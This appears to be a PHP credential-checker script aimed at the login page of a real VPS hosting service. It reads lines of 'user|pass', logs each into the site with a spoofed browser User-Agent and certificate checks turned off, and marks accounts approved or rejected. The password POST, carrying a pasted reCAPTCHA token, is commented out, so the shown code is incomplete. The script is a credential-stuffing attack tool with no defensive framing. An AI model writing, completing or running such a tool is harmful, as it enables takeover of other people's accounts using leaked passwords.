<?php
 function Get4Strings($string,$start,$end){
    $s = explode($start,$string);
    $s = explode($end,$s[1]);
    return $s[0];
}
    $situacao = [ "true" => "APROVADA", "false" => "REJEITADA"];
    $text = $_POST['valor'];
    $list = explode("\n",$text);
    foreach($list as $v => $login){
        if(empty($login) == true || strlen($login) < 12){
            $v++;
            echo "não foi possivel resolver. Login estranho na linha $v...<br>";
        }
        else{
            if(file_exists("\cookie.txt")){
                unlink("\cookie.txt");
            }
                $user = explode("|",$login)[0];
                $pass = explode("|",$login)[1];
                
                $curl = curl_init("https://service.vpsserver.com/users/login/");
                curl_setopt($curl,CURLOPT_COOKIESESSION,true);
                curl_setopt($curl,CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curl,CURLOPT_COOKIEFILE,"\cookie.txt");
                curl_setopt($curl,CURLOPT_COOKIEJAR,"\cookie.txt");
                curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
                curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
                curl_setopt($curl,CURLOPT_ENCODING, 'gzip,deflate,br');
                curl_setopt($curl,CURLOPT_USERAGENT,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
                curl_setopt($curl,CURLOPT_HTTPHEADER,array(
                    "Host: service.vpsserver.com",
                    "Connection: keep-alive",
                    "Referer: https://service.vpsserver.com/users/login/",
                    "Accept-Encoding: gzip, deflate",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Origin: https://service.vpsserver.com",
                    "Content-Type: application/x-www-form-urlencoded"
                ));
                $res = curl_exec($curl);
                //echo $token = Get4Strings($res,'<input type="hidden" name="g-recaptcha-response-v3" id="g-recaptcha-response-v3" value="','">');
                curl_close($curl);
/*
                $curl = curl_init("https://service.vpsserver.com/users/login/");
                curl_setopt($curl,CURLOPT_COOKIESESSION,true);
                curl_setopt($curl,CURLOPT_COOKIEFILE,"\cookie.txt");
                curl_setopt($curl,CURLOPT_COOKIEJAR,"\cookie.txt");
                curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
                curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
                curl_setopt($curl,CURLOPT_USERAGENT,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
                curl_setopt($curl,CURLOPT_HTTPHEADER,array(
                    'Host: service.vpsserver.com',
                    'Connection: keep-alive',
                    'Referer: https://service.vpsserver.com/users/login/',*/
                    //'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    //'Origin: https://service.vpsserver.com',
                    //'Content-Type: application/x-www-form-urlencoded'
                //));
                //curl_setopt($curl,CURLOPT_POSTFIELDS,"_method=POST&email=$user&password=$pass&g-recaptcha-response-v3=03AGdBq27ZVMjsOfjt_MX2pnkQnZF9zcUkrKJiKFkmRF3Ka9S06dsKnUg-_4FdHflVuOiwBGy49o2WW0UmklOk9oeC-BT3je8JM839UJaPH7Lqot5uF1xckejtu2wEvWRiittusJSn01hNPaYyk2eDq7x4uetQwIAq_SmqdP4tzDW7CJ9E7t5BecPeTiKGJb5Ir6SJWCUYfRW-SNbOXrXKC4CmNptLRj5pWDoRIvr8fdxvYdKiXlWOn909M027EVhqHjhONx1Q1lxKeTb9wLyxZmiuOImpgnov4sK-BvLYt-duUKM2qDsUm1bxHkMikvok1rJ2tjxLIxNhIejiKOIusiIAkIDLD5TWCDQ2DO8ye2I8v1xwXJvyeuJP1L7Up0nHHJb0sC9YvSyW");
                
                
        }
        
    }